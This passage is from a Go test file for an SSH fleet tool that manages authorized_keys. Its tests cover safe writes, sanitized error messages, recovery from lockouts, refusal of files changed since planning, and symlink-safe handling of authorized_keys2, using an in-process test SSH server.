		w := &FleetWriter{connect: (&seamedConnect{}).connect, exec: func(ectx context.Context, cl *ssh.Client, cmd string, in io.Reader) (int, *sshconn.CappedBuffer, *sshconn.CappedBuffer, error) {
			cancel() // Ctrl-C arrives mid-write
			sawCanceled = sawCanceled || ectx.Err() != nil
			return s.exec(ectx, cl, cmd, in)
		}}
		if err := w.Apply(ctx, config.Server{Name: "w"}, req("x\n")); err != nil {
			t.Fatalf("Apply: %v — a started write must finish and verify", err)
		}
		if sawCanceled {
			t.Error("stages after the write started must run under a non-cancelable ctx")
		}
	})
}

func TestApplyErrorsAreSanitized(t *testing.T) {
	t.Run("connect error", func(t *testing.T) {
		w := &FleetWriter{exec: (&scriptedExec{}).exec, connect: func(context.Context, config.Server, sshconn.ConnectOptions) (*sshconn.Conn, error) {
			return nil, errors.New("boom\x1b[31m")
		}}
		err := w.Apply(context.Background(), config.Server{Name: "w"}, req("x\n"))
		if err == nil || !strings.Contains(err.Error(), "boom") {
			t.Fatalf("err = %v, want the connect failure surfaced", err)
		}
		if strings.Contains(err.Error(), "\x1b") {
			t.Errorf("err %q leaks control bytes; must pass the sanitized-error path", err)
		}
	})
	t.Run("remote stderr embedded sanitized", func(t *testing.T) {
		s := &scriptedExec{responses: []execResp{{code: 1, stderr: "denied\x1b[31m\x07"}}}
		err := seamedWriter(s, &seamedConnect{}).Apply(context.Background(), config.Server{Name: "w"}, req("x\n"))
		if err == nil || !strings.Contains(err.Error(), "denied") {
			t.Fatalf("err = %v, want remote stderr embedded", err)
		}
		if strings.ContainsAny(err.Error(), "\x1b\x07") {
			t.Errorf("err %q must not contain control bytes", err)
		}
	})
}

// hermetic wires a FleetWriter to an in-process SSH server that runs every
// command through the local /bin/sh with HOME=home, and an agent holding
// agentKeys; only authorized keys may log in.
func hermetic(t *testing.T, home string, authorized []any, agentKeys ...any) (*FleetWriter, config.Server) {
	t.Helper()
	hostKey := sshtest.Signer(t, sshtest.Key(200))
	var pubs []ssh.PublicKey
	for _, k := range authorized {
		pubs = append(pubs, sshtest.Signer(t, k).PublicKey())
	}
	s := sshtest.NewServer(t, sshtest.ServerConfig{
		HostKeys:   []ssh.Signer{hostKey},
		Authorized: pubs,
		Handle:     sshtest.ShellHandler(home),
	})
	d := &sshconn.Dialer{
		KnownHostsPath: sshtest.KnownHostsFile(t, s.KnownHostsLine(hostKey.PublicKey())),
		Creds:          &sshconn.Credentials{AgentSock: sshtest.Agent(t, agentKeys...)},
		DialTimeout:    5 * time.Second,
	}
	return &FleetWriter{Dialer: d}, config.Server{Name: "h1", Host: s.Host, Port: s.Port, User: "deploy"}
}

func ctxTimeout(t *testing.T) context.Context {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	t.Cleanup(cancel)
	return ctx
}

func TestApplyHermeticRealConnection(t *testing.T) {
	op, other := sshtest.Key(1), sshtest.Key(2)
	t.Run("write, verify, probe", func(t *testing.T) {
		home := t.TempDir()
		w, srv := hermetic(t, home, []any{op}, op)
		target := filepath.Join(home, ".ssh", "authorized_keys")
		r := Request{Content: []byte(managed), Expect: Snapshot{Absent: true}, Survivors: []string{sshtest.Fingerprint(t, op)}}
		if err := w.Apply(ctxTimeout(t), srv, r); err != nil {
			t.Fatalf("Apply: %v", err)
		}
		if got := readFile(t, target); got != managed {
			t.Errorf("file = %q, want the render", got)
		}
		assertNoResidue(t, target)
	})
	t.Run("failed login probe restores the previous file", func(t *testing.T) {
		home := t.TempDir()
		// The agent holds both keys, the server accepts only op: a write
		// whose only survivor is the other key proves to be a lockout.
		w, srv := hermetic(t, home, []any{op}, op, other)
		dir := filepath.Join(home, ".ssh")
		if err := os.Mkdir(dir, 0o700); err != nil {
			t.Fatal(err)
		}
		target := filepath.Join(dir, "authorized_keys")
		writeFile(t, target, "previous\n")
		r := Request{Content: []byte(managed), Expect: SnapshotOf(false, []byte("previous\n")), Survivors: []string{sshtest.Fingerprint(t, other)}}
		err := w.Apply(ctxTimeout(t), srv, r)
		var lo *LockoutError
		if !errors.As(err, &lo) || lo.Restore != nil {
			t.Fatalf("err = %v, want a restored *LockoutError", err)
		}
		if got := audit.ErrorKindOf(lo.Probe); got != audit.ErrorKindAuth {
			t.Errorf("probe error kind = %q, want auth", got)
		}
		if got := readFile(t, target); got != "previous\n" {
			t.Errorf("file = %q, want the previous version restored", got)
		}
		assertNoResidue(t, target)
	})
	t.Run("a key-file survivor is proven with no agent at all", func(t *testing.T) {
		home := t.TempDir()
		// The server accepts op (the write login) and ci (the survivor);
		// the run holds both as key files and has no agent.
		ci := sshtest.Key(3)
		w, srv := hermetic(t, home, []any{op, ci})
		w.Dialer.Creds = &sshconn.Credentials{Files: []keyfile.Identity{
			sshtest.Identity(t, "/k/op", op), sshtest.Identity(t, "/k/ci", ci),
		}}
		target := filepath.Join(home, ".ssh", "authorized_keys")
		r := Request{Content: []byte(managed), Expect: Snapshot{Absent: true}, Survivors: []string{sshtest.Fingerprint(t, ci)}}
		if err := w.Apply(ctxTimeout(t), srv, r); err != nil {
			t.Fatalf("Apply with key files only: %v", err)
		}
		if got := readFile(t, target); got != managed {
			t.Errorf("file = %q, want the render", got)
		}
	})
	t.Run("changed since plan is refused over the wire", func(t *testing.T) {
		home := t.TempDir()
		w, srv := hermetic(t, home, []any{op}, op)
		dir := filepath.Join(home, ".ssh")
		if err := os.Mkdir(dir, 0o700); err != nil {
			t.Fatal(err)
		}
		target := filepath.Join(dir, "authorized_keys")
		writeFile(t, target, "edited by a teammate\n")
		r := Request{Content: []byte(managed), Expect: SnapshotOf(false, []byte("what the plan saw\n")), Survivors: []string{sshtest.Fingerprint(t, op)}}
		var chg *ChangedError
		if err := w.Apply(ctxTimeout(t), srv, r); !errors.As(err, &chg) {
			t.Fatalf("err = %v, want *ChangedError", err)
		}
		if got := readFile(t, target); got != "edited by a teammate\n" {
			t.Errorf("file = %q, want the teammate's edit preserved", got)
		}
	})
}

func TestKeys2CmdsThroughRealSh(t *testing.T) {
	forEachShell(t, func(t *testing.T, sh []string) {
		setup := func(t *testing.T) (home, k2 string) {
			home = t.TempDir()
			if err := os.Mkdir(filepath.Join(home, ".ssh"), 0o700); err != nil {
				t.Fatal(err)
			}
			return home, filepath.Join(home, ".ssh", "authorized_keys2")
		}
		t.Run("disable moves the file aside, replacing an old copy", func(t *testing.T) {
			home, k2 := setup(t)
			writeFile(t, k2, "ssh-ed25519 AAAA revoked\n")
			writeFile(t, k2+Keys2DisabledSuffix, "older\n")
			if code := runSh(t, sh, disableKeys2Cmd(), home, nil); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			assertAbsent(t, k2, "authorized_keys2 must be gone")
			if got := readFile(t, k2+Keys2DisabledSuffix); got != "ssh-ed25519 AAAA revoked\n" {
				t.Errorf("disabled copy = %q, want the moved file", got)
			}
		})
		t.Run("disable renames a symlink, never its target", func(t *testing.T) {
			home, k2 := setup(t)
			victim := filepath.Join(home, "victim")
			writeFile(t, victim, "victim\n")
			if err := os.Symlink(victim, k2); err != nil {
				t.Fatal(err)
			}
			if code := runSh(t, sh, disableKeys2Cmd(), home, nil); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			assertAbsent(t, k2, "the link must be moved aside")
			if got := readFile(t, victim); got != "victim\n" {
				t.Errorf("victim = %q, want it untouched", got)
			}
		})
		t.Run("disable of an absent file is a no-op", func(t *testing.T) {
			home, k2 := setup(t)
			if code := runSh(t, sh, disableKeys2Cmd(), home, nil); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			assertAbsent(t, k2+Keys2DisabledSuffix, "nothing to move")
		})
		t.Run("restore puts it back", func(t *testing.T) {
			home, k2 := setup(t)
			writeFile(t, k2+Keys2DisabledSuffix, "keys\n")
			if code := runSh(t, sh, restoreKeys2Cmd(), home, nil); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			if got := readFile(t, k2); got != "keys\n" {
				t.Errorf("authorized_keys2 = %q, want it restored", got)
			}
		})
		t.Run("restore never clobbers a recreated file", func(t *testing.T) {
			home, k2 := setup(t)
			writeFile(t, k2, "new\n")
			writeFile(t, k2+Keys2DisabledSuffix, "keys\n")
			if code := runSh(t, sh, restoreKeys2Cmd(), home, nil); code != changedExit {
				t.Fatalf("exit = %d, want %d", code, changedExit)
			}
			if got := readFile(t, k2); got != "new\n" {
				t.Errorf("authorized_keys2 = %q, want the recreated file kept", got)
			}
		})
	})
}

func TestApplyDisablesKeys2BeforeTheProbe(t *testing.T) {
	r := req("x\n")
	r.DisableKeys2 = true
	t.Run("order", func(t *testing.T) {
		s := &scriptedExec{responses: []execResp{{code: 0}, {code: 0, stdout: "x\n"}, {code: 0}}}
		if err := seamedWriter(s, &seamedConnect{}).Apply(context.Background(), config.Server{Name: "w"}, r); err != nil {
			t.Fatalf("Apply: %v", err)
		}
		if len(s.cmds) != 4 || s.cmds[2] != disableKeys2Cmd() || s.cmds[3] != probeCmd {
			t.Errorf("cmds = %q, want write, verify, disable authorized_keys2, then the probe", s.cmds)
		}
	})
	t.Run("probe failure restores both files", func(t *testing.T) {
		s := &scriptedExec{responses: []execResp{{code: 0}, {code: 0, stdout: "x\n"}, {code: 0}, {code: 0}, {code: 0}}}
		err := seamedWriter(s, &seamedConnect{probeErr: errors.New("denied")}).Apply(context.Background(), config.Server{Name: "w"}, r)
		var lo *LockoutError
		if !errors.As(err, &lo) || lo.Restore != nil {
			t.Fatalf("err = %v, want a restored *LockoutError", err)
		}
		if len(s.cmds) != 5 || s.cmds[4] != restoreKeys2Cmd() {
			t.Errorf("cmds = %q, want the authorized_keys2 restore after the file restore", s.cmds)
		}
	})
	t.Run("disable failure still probes and is a failure", func(t *testing.T) {
		s := &scriptedExec{responses: []execResp{{code: 0}, {code: 0, stdout: "x\n"}, {code: 1, stderr: "mv: denied"}}}
		err := seamedWriter(s, &seamedConnect{}).Apply(context.Background(), config.Server{Name: "w"}, r)
		if err == nil || !strings.Contains(err.Error(), "authorized_keys2") || IsRefusal(err) {
			t.Fatalf("err = %v, want a non-refusal authorized_keys2 failure", err)
		}
		var lo *LockoutError
		if errors.As(err, &lo) {
			t.Errorf("err = %v, want no lockout (authorized_keys2 only adds keys)", err)
		}
		if len(s.cmds) != 4 || s.cmds[3] != probeCmd {
			t.Errorf("cmds = %q, want the probe to run regardless", s.cmds)
		}
	})
}
